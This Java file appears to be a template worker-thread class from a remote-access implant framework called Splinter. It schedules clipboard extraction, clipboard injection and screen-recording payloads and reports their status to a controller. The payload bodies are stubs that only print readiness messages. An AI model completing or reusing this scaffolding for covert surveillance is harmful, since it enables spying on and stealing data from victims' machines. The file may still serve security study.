/**
 * @author Solomon Sonya
 */

package Implant.Payloads;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.*;
import java.io.*;
import java.util.ArrayList;
import javax.*;
import javax.imageio.ImageIO;
import javax.swing.Timer;

import Controller.Drivers.Drivers;
import Implant.Driver;
import Implant.Splinter_IMPLANT;

public class TEMPLATE_Worker_Thread_Payloads extends Thread implements Runnable, ActionListener
{
	public static final String strMyClassName = "Worker_Thread_Payloads";
	
	Timer tmrInterrupt = null;
	int timerInterrupt_millis = 1000;
	
	boolean killThisThread = false;
	
	Splinter_IMPLANT implant = null;
	
	boolean dismissInterrupt = false;
	
	public int payload_execution_index = 0;
	
	public static final int PAYLOAD_CLIPBOARD_EXTRACTION = 0;
	public static final int PAYLOAD_CLIPBOARD_INJECTION = 1;
	public static final int PAYLOAD_RECORD_SCREEN = 2;
	
	public static final String [] arrPayloadTypes = {
														"CLIPBOARD EXTRACTION",
														"CLIPBOARD INJECTION",
														"RECORD SCREEN"
													};
	
	public static volatile boolean TERMINATE_ALL_WORKERS_CLIPBOARD = false;
	public static volatile boolean TERMINATE_ALL_WORKERS_RECORD_SCREEN = false;
	
	public String payloadType = "";
	
	
	public TEMPLATE_Worker_Thread_Payloads(int timing_millis, Splinter_IMPLANT agent, int payload_index)
	{
		try
		{
			implant = agent;
			timerInterrupt_millis = timing_millis;
			payload_execution_index = payload_index;
			payloadType = arrPayloadTypes[payload_execution_index];
			killThisThread = false;
			this.dismissInterrupt = false;
			
			//
			//
			//
			if(payload_index == PAYLOAD_CLIPBOARD_EXTRACTION || payload_index == PAYLOAD_CLIPBOARD_INJECTION)
			{
				TERMINATE_ALL_WORKERS_CLIPBOARD = false;
			}
			
			if(payload_index == PAYLOAD_RECORD_SCREEN)
			{
				TERMINATE_ALL_WORKERS_RECORD_SCREEN = false;
			}
			
			
			//
			//all is well, start the thread
			//
			this.start();
			
		}
		catch(Exception e)
		{
			Driver.eop("Null Constructor", strMyClassName, e, "", false);
			killThisThread = true; //error, do not run
		}
		
		
	}
	
	public void run()
	{
		try
		{
			if(!killThisThread)
			{
				
				//start the timer
				this.tmrInterrupt = new Timer(this.timerInterrupt_millis, this);
				tmrInterrupt.start();
				
				//NO ERRORS, REPORT SUCCESS TO CONTROLLER
				String notification = "Worker Thread Started for " + payloadType + " interrupt interval: " + timerInterrupt_millis/1000 + " second(s)";
				this.sendToController(notification);
				Driver.sop(notification);
			}
			else
			{
				this.sendToController("UNABLE TO START WORKER THREAD!!!");
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("run", strMyClassName, e, "", false);
		}
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.tmrInterrupt)
			{
				//
				//ENSURE NOT TIME TO KILL ALL WORKER THREADS OF SAME TYPE
				//
				if(TERMINATE_ALL_WORKERS_CLIPBOARD && payload_execution_index == PAYLOAD_CLIPBOARD_EXTRACTION || payload_execution_index == PAYLOAD_CLIPBOARD_INJECTION)
				{
					//simply indicate to kill this thread, then pop out of intrrupt
					killThisThread = true;
					
					String kill = "Worker Thread Kill command received for all " + this.payloadType + " payload types.... killing this thread softly...";
					this.sendToController(kill);
					Driver.sop(kill);
				}
				
				if(TERMINATE_ALL_WORKERS_RECORD_SCREEN && payload_execution_index == PAYLOAD_RECORD_SCREEN)
				{
					//simply indicate to kill this thread, then pop out of intrrupt
					killThisThread = true;
					
					String kill = "Worker Thread Kill command received for all " + this.payloadType + " payload types.... killing this thread softly...";
					this.sendToController(kill);
					Driver.sop(kill);
				}
				
				//
				//IS IT TIME TO HALT THIS WORKER THREAD?
				//				
				if(killThisThread)
				{
					String kill = "Worker Thread Kill command received.... killing this thread softly...";
					this.sendToController(kill);
					Driver.sop(kill);
					
					try
					{
						this.tmrInterrupt.stop();
					}catch(Exception e){}
				}
				
				//
				//ELSE, EXECUTE INTERRUPT
				//
				if(!this.dismissInterrupt)
				{
					dismissInterrupt = true;									
					
					//process the interrupt by checking the appropriate action
					executeAction(payload_execution_index);
					
					//done, release semophore flag
					dismissInterrupt = false;
				}
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("AE", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	public static boolean executeAction(int execution_index)
	{
		try
		{
			//determine payload execution action
			switch(execution_index)
			{
				case PAYLOAD_CLIPBOARD_EXTRACTION:
				{					
					Driver.sop("READY TO EXTRACT CLIPBOARD");
					
					break;
				}
				
				case PAYLOAD_CLIPBOARD_INJECTION:
				{
					Driver.sop("READY TO INJECT CLIPBOARD");
					
					break;
				}
				
				case PAYLOAD_RECORD_SCREEN:
				{
					Driver.sop("READY TO RECORD SCREEN");
					
					break;
				}
			
				
				default:
				{
					Driver.sop("Unknown execution action received in " + strMyClassName);
					return false;
				}			
			}
			
			
			
			
			return true;
		}
		
		catch(Exception e)
		{
			Drivers.eop("executionAction", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	
	
	public boolean sendToController(String strToSend)
	{
		try
		{
			if(implant != null)
			{
				implant.sendToController(strToSend, false, false);				
			}
						
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendToController", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
}
